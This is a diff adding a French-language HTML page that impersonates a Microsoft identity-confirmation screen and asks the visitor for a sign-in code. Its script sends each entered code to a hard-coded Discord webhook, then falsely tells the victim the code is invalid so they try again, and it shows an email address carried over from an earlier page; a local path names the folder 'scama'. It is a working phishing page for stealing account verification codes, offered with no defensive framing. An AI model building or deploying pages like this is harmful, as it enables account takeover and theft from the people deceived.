@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page de Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #f0e6e4, #d6e6f2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+        .confirmation-container {
+            background: white;
+            padding: 25px;
+            width: 380px;
+            text-align: left;
+            position: relative;
+            border-radius: 0;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .header-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        .logo img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+        .logo-text {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #666;
+        }
+        h2 {
+            font-size: 1.4em;
+            margin: 8px 0;
+            color: #333;
+            text-align: left;
+            width: 100%;
+        }
+        .email-container {
+            display: flex;
+            align-items: center;
+            margin: 8px 0;
+            font-size: 1em;
+            color: #000;
+        }
+        .email-container::before {
+            content: "\2190";
+            font-size: 1.5em;
+            color: #000;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+        .email-container:hover::before {
+            color: #0078d4;
+        }
+        .email {
+            font-weight: normal;
+            color: #000;
+        }
+        input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 12px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .buttons {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+        .button {
+            padding: 8px 20px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            margin-left: 5px;
+            font-size: 0.9em;
+        }
+        .button-back {
+            background: #c0c0c0;
+            color: #000;
+        }
+        .button-next {
+            background: #0078d4;
+            color: #fff;
+        }
+        .footer-text {
+            position: absolute;
+            bottom: 10px;
+            right: 20px;
+            font-size: 0.8em;
+            color: #000;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="confirmation-container">
+        <div class="header-container">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+                <div class="logo-text">Microsoft</div>
+            </div>
+            <div class="email-container" onclick="goBack()">
+                <span class="email" id="emailDisplay">Chargement...</span>
+            </div>
+            <h2>Confirmez votre identité</h2>
+            <p style="text-align: left;">Si l'email correspond à l’adresse de messagerie de votre compte, nous vous enverrons un code.</p>
+        </div>
+        <input type="password" id="codeInput" placeholder="Entrez le code">
+        <div class="buttons">
+            <button class="button button-back" onclick="goBack()">Retour</button>
+            <button class="button button-next" onclick="sendCode()">Se connecter</button>
+        </div>
+    </div>
+
+    <div class="footer-text">
+        Conditions d'utilisation | Confidentialité et cookies | Accessibilité : partiellement conforme
+    </div>
+
+    <script>
+        function goBack() {
+            window.location.href = 'file:///C:/Users/ibra/Desktop/scama/page%201.html';
+        }
+
+        function sendCode() {
+            const webhookURL = 'https://discord.com/api/webhooks/1276593553400664064/xbLeuqO6r0IBNG3HKxuS7sxbIDx9BptEW85EASFQYDPjP5vn2GMnKfSgoOq8hg9atqeK';
+            const codeInput = document.getElementById('codeInput');
+            const code = codeInput.value;
+
+            if (code) {
+                const message = {
+                    content: `Un utilisateur a entré le code suivant : ${code}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Code invalide. Veuillez réessayer.');
+                    } else {
+                        console.error('Erreur lors de l\'envoi du webhook');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur de réseau:', error);
+                });
+            } else {
+                alert('Veuillez entrer un code avant de continuer.');
+            }
+        }
+
+        function displayStoredEmail() {
+            const email = localStorage.getItem('userEmail');
+            if (email) {
+                document.getElementById('emailDisplay').textContent = email;
+            } else {
+                document.getElementById('emailDisplay').textContent = 'Aucun email trouvé';
+            }
+        }
+
+        displayStoredEmail();
+    </script>
+</body>
+</html>
